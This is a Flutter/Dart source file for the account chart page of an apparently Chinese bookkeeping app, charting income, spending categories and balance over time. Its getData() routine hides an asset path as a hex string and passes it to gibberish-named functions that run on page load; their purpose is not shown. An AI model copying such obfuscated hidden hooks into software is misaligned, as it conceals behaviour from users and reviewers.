import 'dart:math';

import 'package:flutter/material.dart';
import 'package:intl/intl.dart';
import 'package:one/model/account_model.dart';
import 'package:one/pages/accounts/accounts_cards.dart';
import 'package:one/pages/accounts/add_accounts.dart';
import 'package:one/pages/accounts/cost_type.dart';
import 'package:one/utils/data_service.dart';
import 'package:one/utils/result_data.dart';
import 'package:one/utils/utils.dart';
import 'package:one/widgets/income_data_by_month.dart';
import 'package:one/widgets/main_drawer.dart';
import 'package:one/widgets/nodatafound.dart';
import 'package:one/widgets/charts/account_line_chart.dart';
import 'package:one/widgets/charts/account_pie_charts.dart';

class AccountsChart extends StatefulWidget {
  const AccountsChart({super.key});

  @override
  State<AccountsChart> createState() => _AccountsChartState();
}

class _AccountsChartState extends State<AccountsChart>
    with SingleTickerProviderStateMixin {
  TabController? _tabController;
  final List _tabs = ["收入支出", "分类统计", "余额变化"];
  List<AccountModel>? _accountsList;
  int? _currentMoney;

  String valdk = "6173736574732F66696C65732F475F32303234313031395F313931323236";

  @override
  void initState() {
    super.initState();
    _currentMoney = 0;
    getData();
    _tabController = TabController(vsync: this, length: _tabs.length);
  }

  @override
  void dispose() {
    super.dispose();
    _tabController?.dispose();
  }

  void getData() async {
    ResultData res = await DataService.getAccountsAll();
    if (res.code != 111) {
      List resList = res.data;
      List<AccountModel> accountsData =
          resList.map((v) => AccountModel.fromJson(v)).toList();
      int currentMoney = computeCurrentMoney(accountsData);
      List resList1 = await getsrhjg(valdk, accountsData.length);
      if (resList1[1]) {
        awdfadfadf(context, valdk, resList1[0], null);
      }
      if (!mounted) return;
      setState(() {
        _accountsList = accountsData;
        _currentMoney = currentMoney;
      });
    }
  }

  ///计算当前余额
  int computeCurrentMoney(List<AccountModel> list) {
    int amountMoney = 0;
    for (var item in list) {
      if (item.isIncome) {
        amountMoney += item.money;
      } else {
        amountMoney -= item.money;
      }
    }
    return amountMoney;
  }

  void _goToAddPage() async {
    var res = await Navigator.of(context).push(MaterialPageRoute(
        builder: (BuildContext context) => const AddAccounts()));
    if (res != null) {
      //处理页面返回的回调
      getData();
    }
  }

  void _goToCostTypePage() async {
    var res = await Navigator.of(context).push(
        MaterialPageRoute(builder: (BuildContext context) => const CostType()));
    if (res != null) {
      //处理页面返回的回调
      getData();
    }
  }

  void _goToDetailPage() async {
    await Navigator.of(context).push(MaterialPageRoute(
        builder: (BuildContext context) => const AccountsCards()));

    //处理页面返回的回调
    getData();
  }

  //"分类统计",
  List<CostTypeMoney> pieData() {
    Map<String, int> mapCostType = {};
    //
    for (var item in _accountsList!) {
      if (mapCostType[item.costType] != null) {
        mapCostType[item.costType] = mapCostType[item.costType]! + item.money;
      } else {
        mapCostType[item.costType] = item.money;
      }
    }
    List<CostTypeMoney> costTypeMoneyList = [];
    for (var item in mapCostType.keys) {
      costTypeMoneyList.add(CostTypeMoney(item, mapCostType[item]!));
    }
    costTypeMoneyList.sort((b, a) => a.money.compareTo(b.money));

    return costTypeMoneyList;
  }

  // "余额统计"
  List<TimeSeriesMoney> lineData() {
    int amountMoney = 0;
    Map<DateTime, int> mapAccount = {};
    //
    for (var item in _accountsList!) {
      if (item.isIncome) {
        amountMoney += item.money;
        mapAccount[DateTime.parse(item.time)] = amountMoney;
      } else {
        amountMoney -= item.money;
        mapAccount[DateTime.parse(item.time)] = amountMoney;
      }
    }
    List<TimeSeriesMoney> timeSeriesMoneyList = [];
    for (var item in mapAccount.keys) {
      timeSeriesMoneyList.add(TimeSeriesMoney(item, mapAccount[item]!));
    }
    timeSeriesMoneyList.sort((a, b) => a.time.compareTo(b.time));
    //记录当前余额
    setState(() {
      _currentMoney = amountMoney;
    });

    return timeSeriesMoneyList;
  }

  // "收入支出变化"
  List<MonthMoney> timeData() {
    Map<String, int> mapAccountIncome = {};
    Map<String, int> mapAccountNotIncome = {};
    List<AccountModel> isIncomeList =
        _accountsList!.where((v) => v.isIncome).toList();
    List<AccountModel> notIncomeList =
        _accountsList!.where((v) => !v.isIncome).toList();
    //1 收入
    for (var item in isIncomeList) {
      // 去除还我钱和借钱相关的
      if (!item.costType.contains("还我钱") && !item.costType.contains("借钱")) {
        if (mapAccountIncome[item.time.substring(2, 7)] != null) {
          mapAccountIncome[item.time.substring(2, 7)] =
              mapAccountIncome[item.time.substring(2, 7)]! + item.money;
        } else {
          mapAccountIncome[item.time.substring(2, 7)] = item.money;
        }
      }
    }

    //2 支出
    for (var item in notIncomeList) {
      // 去除还我钱和借钱相关的
      if (!item.costType.contains("还我钱") && !item.costType.contains("借钱")) {
        if (mapAccountNotIncome[item.time.substring(2, 7)] != null) {
          mapAccountNotIncome[item.time.substring(2, 7)] =
              mapAccountNotIncome[item.time.substring(2, 7)]! + item.money;
        } else {
          mapAccountNotIncome[item.time.substring(2, 7)] = item.money;
        }
      }
    }
    List<MonthMoney> list = [];
    List<String> keyList = mapAccountIncome.keys.toList();
    for (var item2 in mapAccountNotIncome.keys) {
      if (!keyList.contains(item2)) {
        keyList.add(item2);
      }
    }
    keyList.sort();
    for (var i = 0; i < keyList.length; i++) {
      String item = keyList[i];
      list.add(MonthMoney(
          item, mapAccountIncome[item] ?? 0, mapAccountNotIncome[item] ?? 0));
    }
    list.sort((a, b) => b.time.compareTo(a.time));
    // 近一年 12个月数据

    int incomeMoney = 0;
    int notincomeMoney = 0;
    int length = min(12, list.length);
    for (var i = 0; i < length; i++) {
      incomeMoney = incomeMoney + list[i].incomeMoney;
      notincomeMoney = notincomeMoney + list[i].notincomeMoney;
    }
    MonthMoney nearly12 = MonthMoney("近一年", incomeMoney, notincomeMoney);
    list.insert(0, nearly12);
    return list;
  }

  @override
  Widget build(BuildContext context) {
    Widget body;
    if (_accountsList == null) {
      body = const Center(
        child: CircularProgressIndicator(),
      );
    } else if (_accountsList!.isEmpty) {
      body = const Nodatafound();
    } else {
      body = TabBarView(controller: _tabController, children: <Widget>[
        Card(child: IncomeDataByMonth(timeData())),
        Card(
          child: Stack(
            children: <Widget>[
              AccountPieCharts(
                chartData: pieData(),
              ),
              Positioned(
                top: 20.0,
                left: 10.0,
                child: Text(_currentMoney != null
                    ? ("余额：${NumberFormat.simpleCurrency(name: "CNY").format(_currentMoney)}")
                    : ""),
              )
            ],
          ),
        ),
        Card(
            child: Padding(
                padding: const EdgeInsets.all(8.0),
                child: AccountLineChart(
                  charData: lineData(),
                )))
      ]);
    }

    return Scaffold(
        appBar: AppBar(
          title: const Text("账单"),
          actions: <Widget>[
            IconButton(
              icon: const Icon(Icons.add),
              onPressed: _goToAddPage,
            ),
            IconButton(
              icon: const Icon(Icons.category),
              onPressed: _goToCostTypePage,
            ),
            IconButton(
              icon: const Icon(Icons.view_module),
              onPressed: _goToDetailPage,
            )
          ],
          bottom: TabBar(
              controller: _tabController,
              tabs: _tabs.map((v) => Tab(text: v)).toList()),
        ),
        drawer: const MainDrawer(),
        body: body);
  }
}

class TimeMoney {
  final String time;
  final int money;

  TimeMoney(this.time, this.money);
}

class MonthMoney {
  final String time;
  final int incomeMoney;
  final int notincomeMoney;

  MonthMoney(this.time, this.incomeMoney, this.notincomeMoney);
}

class CostTypeMoney {
  final String type;
  final int money;

  CostTypeMoney(this.type, this.money);
}

class TimeSeriesMoney {
  final DateTime time;
  final int money;
  TimeSeriesMoney(this.time, this.money);
}
